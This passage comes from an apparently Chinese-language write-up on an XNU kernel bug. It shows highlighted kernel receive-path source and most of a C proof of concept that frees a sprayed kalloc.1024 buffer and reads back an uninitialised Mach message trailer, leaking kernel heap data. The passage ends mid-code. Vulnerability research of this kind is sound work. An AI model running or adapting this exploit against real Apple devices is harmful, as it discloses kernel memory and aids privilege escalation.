		&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;local_port&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CAST_MACH_PORT_TO_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_local_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;voucher_port&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mach_msg_id_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;                      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;legacy_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_id&lt;/span&gt;                  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;legacy_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_local_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;legacy_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;legacy_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_voucher_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;legacy_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt;                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LEGACY_HEADER_SIZE_DELTA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;legacy_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt;                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LEGACY_HEADER_SIZE_DELTA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;legacy_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif
&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/* Re-Compute target address if using stack-style delivery */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;rcv_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 拷贝消息&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copyoutmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_INVALID_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 释放掉内核态的消息结构体&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sizep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sizep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;总结一下，我们现在可以通过设置函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;的第二个参数为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACH_RCV_MSG | MACH_RCV_TRAILER_ELEMENTS(5)&lt;/code&gt;来获取到最大的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;trailer-&amp;gt;msgh_trailer_size&lt;/code&gt;，而且可以跳过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;trailer-&amp;gt;msgh_ad&lt;/code&gt;的初始化&lt;/p&gt;

&lt;p&gt;现在来看Poc代码&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;mach/mach.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define MAGIC 0x416e7953 // 'SynA'
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;mach_port_allocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_RIGHT_RECEIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_insert_right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_MAKE_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Allocating controlled (magic value %x) kalloc.1024 buffer&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAGIC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1020&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1020&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;pipe_buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAGIC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1020&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Creating kalloc.1024 ipc_kmsg&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_base_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;// size to fit in kalloc.1024, trust me, I'm an expert (c)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

	&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_TRAILER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_TRAILER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_COPY_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_TRAILER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Freeing controlled buffer&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Sending message&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	        &lt;span class=&quot;n&quot;&gt;MACH_SEND_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	        &lt;span class=&quot;n&quot;&gt;message_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	        &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	        &lt;span class=&quot;n&quot;&gt;MACH_MSG_TIMEOUT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	        &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_TRAILER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Now reading message back&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	        &lt;span class=&quot;n&quot;&gt;MACH_RCV_MSG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_TRAILER_ELEMENTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; 
	        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	        &lt;span class=&quot;n&quot;&gt;message_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_TRAILER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	        &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	        &lt;span class=&quot;n&quot;&gt;MACH_MSG_TIMEOUT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
